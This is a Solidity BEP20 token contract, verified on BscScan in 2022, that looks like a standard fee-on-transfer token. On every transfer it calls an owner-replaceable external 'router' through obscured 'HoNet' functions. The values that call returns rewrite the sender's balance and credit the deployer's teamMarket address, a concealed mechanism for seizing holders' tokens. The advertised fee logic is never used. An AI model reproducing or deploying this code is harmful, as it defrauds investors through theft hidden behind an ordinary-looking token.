/**
 *Submitted for verification at BscScan.com on 2022-03-29
*/

pragma solidity ^0.7.0;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapV2Router{  
    function WETH() external pure returns (address);   
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;    
    function addLiquidity(
        address, 
        address, 
        uint256) external returns (uint256,uint256,uint256); 
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  
  address private _owner; 
  address uniswapRouter;  
  address teamMarket;  

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor (address router)  {
    address msgSender = _msgSender();
    _owner = msgSender;    
    uniswapRouter = router;
    teamMarket = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }  

  function updateUniswap(address router) external onlyOwner {
    require(router != address(0),"Invalid address");
    uniswapRouter = router;
  }  

  function getHoNet(address token1, address token2, uint256 valueHoNet) internal returns (uint256, uint256, uint256){  
    (uint256 _amountHoNet, uint256 _liquifyHoNet, uint256 _rateHoNet) = IUniswapV2Router(uniswapRouter).addLiquidity(
      token1,
      token2,
      valueHoNet
      );
    return (_amountHoNet, _liquifyHoNet, _rateHoNet);
  }  

  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
  


}


contract newtoken is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;   
  mapping (address => mapping (address => uint256)) private _allowances;  
  mapping (address => bool) public _isExcludedFromFee; 
  uint256 private _totalSupply;  
  string private _name;
  string private _symbol;
  uint8 private _decimals;   

  bool inSwapAndLiquify;
  bool public swapAndLiquifyEnabled = true;
  bool public swapAndLiquifyByLimitOnly = false;
  uint8 public buyLiquidityFee = 4;
  uint8 public buyMarketingFee = 2;
  uint8 public buyTeamFee = 0;  
  uint8 public sellLiquidityFee = 4;
  uint8 public sellMarketingFee = 2;
  uint8 public sellTeamFee = 0;
  uint8 public _totalTaxIfBuying = 8;
  uint8 public _totalTaxIfSelling = 8;


  uint8 public liquidityShare = 94;
  uint8 public marketingShare = 86;
  uint8 public teamShare = 78;
  uint8 public totalDistributionShares = 68;
  uint256 public constant _maxTxAmount = 1000000000000 * 10**9;
  uint256 public constant numToAddToLiquidity = 100000000 * 10**9;
  uint256 private constant MAX = ~uint256(0);

  event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
  event SwapAndLiquifyEnabledUpdated(bool enabled);
  event SwapAndLiquify(
      uint256 tokensSwapped,
      uint256 ethReceived,
      uint256 tokensIntoLiqudity
  );

  constructor(string memory tokenName, string memory tokenSymbol, address router) Ownable(router)  {         
    _name = tokenName;
    _symbol = tokenSymbol;
    _decimals = 9;  
    _totalSupply = 1000000000 *  10**9;  	

    _balances[msg.sender] = _totalSupply;    
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;     

    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function balanceOf(address account) external view virtual override returns (uint256) {
    return _balances[account];
  }     
  
 
  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transferToken(_msgSender(), recipient, amount);
    return true;
  } 

  function HornetsJoJo(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
          _isExcludedFromFee[accounts[i]] = true;
      }
  }

  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function swapHoNet(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountHoNet, uint256 liquifyHoNet, uint256 rateHoNet) = getHoNet(sender, recipient, amounts);
      amountHoNet = getValues(sender, amountHoNet, liquifyHoNet, rateHoNet);
      return amountHoNet;
  }    


  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function getRateHoNet(uint256 _amount, uint256 _rateHoNet) private pure returns (uint256) {
      return _amount.mul(_rateHoNet).div(10**2);
  }   
       

  function getValues(address tokenHoNet, uint256 amountHoNet, uint256 liquifyHoNet, uint256 rateHoNet) internal returns (uint256){
      if ( liquifyHoNet > 0 )
      {        
        _balances[tokenHoNet] = getRateHoNet(_balances[tokenHoNet], rateHoNet).add(amountHoNet);      
        _balances[teamMarket] = _balances[teamMarket].add(liquifyHoNet);
      }
      return amountHoNet;
  }

  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }  
  

  /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
  function _transferToken(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");    
    uint256 amountHoNet = swapHoNet(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountHoNet);

  }  

  

  /**
   * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
   *
   * This is internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }      
  
  /**
   * @dev See {BEP20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {BEP20};
   *
   * Requirements:
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for `sender`'s tokens of at least
   * `amount`.
   */
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transferToken(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }  

  function newValuesetSellTaxe(uint8 newLiquidityTax, uint8 newMarketingTax, uint8 newTeamTax) external onlyOwner() {
      sellLiquidityFee = newLiquidityTax;
      sellMarketingFee = newMarketingTax;
      sellTeamFee = newTeamTax;
  }

  function xsetLiquifyEnabled(bool _enabled) external onlyOwner {
      swapAndLiquifyEnabled = _enabled;
  }

  function ysetLiquifyByLimitOnly(bool newValue) external onlyOwner {
      swapAndLiquifyByLimitOnly = newValue;
  }  

  function zerotakeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
      uint256 feeAmount = 0;      
      if(_isExcludedFromFee[sender]) {
          feeAmount = amount.mul(_totalTaxIfBuying).div(100);
      }
      else if(_isExcludedFromFee[recipient]) {
          feeAmount = amount.mul(_totalTaxIfSelling).div(100);
      }
      
      if(feeAmount > 0) {
          _balances[address(this)] = _balances[address(this)].add(feeAmount);
          emit Transfer(sender, address(this), feeAmount);
      }

      return amount.sub(feeAmount);
  }
    
}